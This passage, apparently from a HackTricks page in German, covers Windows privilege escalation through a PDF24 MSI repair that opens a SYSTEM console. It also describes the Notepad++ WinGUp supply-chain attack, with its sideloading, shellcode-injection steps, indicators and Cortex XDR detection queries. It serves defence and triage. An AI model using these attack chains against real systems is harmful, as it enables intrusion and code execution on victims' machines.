- Dieses Muster lässt sich auf andere Endpoint-Agenten und Updater übertragen, die **temporäre Skripte an für alle beschreibbaren Orten ablegen und später als SYSTEM ausführen**. Prüfen Sie auf vorhersehbare Namen, fehlende exklusive Erstellung und Reparatur-/Update-Abläufe, die sich bei Bedarf auslösen lassen.

### Interaktive Installer-Reparatur und privilegierte Konsole

PDF24 Creator 11.15.1 veranschaulicht ein separates Risiko bei der MSI-Reparatur: Die benutzerdefinierte Druckerinstallationsaktion kann während der Reparatur eine sichtbare Konsole mit SYSTEM-Rechten starten. Der Anbieter änderte den MSI-Installer in Version 11.15.2, um dieses Verhalten zu beheben. Eine ältere Produktversion ist lediglich ein Hinweis für die Triage. Prüfen Sie das registrierte oder erreichbare MSI-Paket, ob dieser Benutzer eine Reparatur starten kann, ob die anfällige benutzerdefinierte Aktion und die Verzögerung durch die Protokolldatei vorhanden sind und ob ein interaktiver Desktop die Konsole sichtbar machen kann. Für die gemeldete Verzögerung wurde ein Oplock auf `faxPrnInst.log` verwendet; gewöhnliche Schreibberechtigungen für die Datei sind nicht die einzige Zugriffsbedingung. Eine nicht-interaktive Shell, ein nicht zugängliches Paket oder ein gepatchter Installer können die Angriffskette unterbrechen. Dieses Problem hängt nicht von `AlwaysInstallElevated` ab und unterscheidet sich vom Ersetzen eines vorhersehbaren temporären Skripts.

---
## Remote-Hijacking der Supply Chain durch schwache Updater-Validierung (WinGUp / Notepad++)

Zwischen Juni 2025 und Dezember 2025 lieferten Angreifer, die die Hosting-Infrastruktur hinter dem Notepad++-Update-Ablauf kompromittiert hatten, gezielt ausgewählten Opfern bösartige Manifeste aus. Ältere Updater auf WinGUp-Basis überprüften die Authentizität von Updates nicht vollständig, sodass eine manipulierte XML-Antwort Clients auf von Angreifern kontrollierte URLs umleiten konnte. Da der Client HTTPS-Inhalte akzeptierte, ohne sowohl eine vertrauenswürdige Zertifikatskette als auch eine gültige PE-Signatur des heruntergeladenen Installers zu erzwingen, luden Opfer ein trojanisiertes NSIS-`update.exe` herunter und führten es aus.<sup>[[12]](#references)[[13]](#references)</sup>

Ablauf (kein lokaler Exploit erforderlich):
1. **Abfangen der Infrastruktur**: CDN/Hosting kompromittieren und auf Update-Prüfungen mit Angreifer-Metadaten antworten, die auf eine bösartige Download-URL verweisen.
2. **Trojanisiertes NSIS**: Der Installer lädt eine Payload herunter und führt sie aus und missbraucht dabei zwei Ausführungsketten:
   - **Signierte Binärdatei mitbringen + Sideloading**: Die signierte Bitdefender-Datei `BluetoothService.exe` mitliefern und eine bösartige `log.dll` in deren Suchpfad ablegen. Beim Ausführen der signierten Binärdatei lädt Windows `log.dll` per Sideloading, die die Chrysalis-Backdoor entschlüsselt und reflektiv lädt (durch Warbird geschützt und mit API-Hashing, um die statische Erkennung zu erschweren).
   - **Skriptgesteuerte Shellcode-Injektion**: NSIS führt ein kompiliertes Lua-Skript aus, das Win32-APIs (z. B. `EnumWindowStationsW`) verwendet, um Shellcode zu injizieren und Cobalt Strike Beacon bereitzustellen.<sup>[[12]](#references)</sup>

Maßnahmen zur Härtung und Erkennung für jeden Auto-Updater:
- **Zertifikats- und Signaturprüfung** des heruntergeladenen Installers erzwingen (Signatur des Anbieters festlegen, abweichenden CN/Zertifikatskette ablehnen) und das Update-Manifest selbst signieren (z. B. mit XMLDSig). Durch das Manifest gesteuerte Weiterleitungen blockieren, sofern sie nicht validiert wurden.
- **Sideloading mit eigener signierter Binärdatei (BYO)** als Erkennungsmöglichkeit nach dem Download behandeln: Alarmieren, wenn eine signierte Anbieter-EXE eine DLL mit einem Namen außerhalb ihres kanonischen Installationspfads lädt (z. B. Bitdefender, das `log.dll` aus Temp/Downloads lädt) und wenn ein Updater Installer mit Nicht-Anbieter-Signaturen in einem temporären Verzeichnis ablegt oder ausführt.
- **Malwarespezifische Artefakte** überwachen, die in dieser Angriffskette beobachtet wurden (als allgemeine Ansatzpunkte nützlich): Mutex `Global\Jdhfv_1.0.1`, anomale Schreibvorgänge von `gup.exe` nach `%TEMP%` und Lua-gesteuerte Shellcode-Injektionsstufen.
- Notepad++ reagierte darauf, indem WinGUp ab Version v8.8.9 verstärkt wurde: Das zurückgegebene XML ist nun signiert (XMLDSig), und neuere Builds erzwingen die Zertifikats- und Signaturprüfung des heruntergeladenen Installers, statt allein dem Transport zu vertrauen.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading von <code>log.dll</code> durch eine von Bitdefender signierte EXE (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> startet einen Installer, der nicht zu Notepad++ gehört</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Diese Muster lassen sich auf jeden Updater übertragen, der nicht signierte Manifeste akzeptiert oder die Signierer von Installern nicht festlegt: Eine Netzwerkübernahme + ein schädlicher Installer + BYO-signiertes Sideloading ermöglichen Remote Code Execution unter dem Deckmantel „vertrauenswürdiger“ Updates.

---
## References
- [1] [Hinweis – Netskope Client for Windows – lokale Rechteausweitung über Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-Sicherheitshinweis NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-Plug-in](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope-IPC-Client/Exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre und Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Lokale Rechteausweitung über beschreibbare Dateien im Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Rechteausweitung im Windows-Agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Staatliche Akteure nutzen die Notepad++-Lieferkette aus](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Update zum Vorfall mit kompromittierter Infrastruktur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Umgehen der Fehlerbehebung für CVE-2025-0309 im Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Aufdecken von Rechteausweitungsfehlern in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Von gRPC zu SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
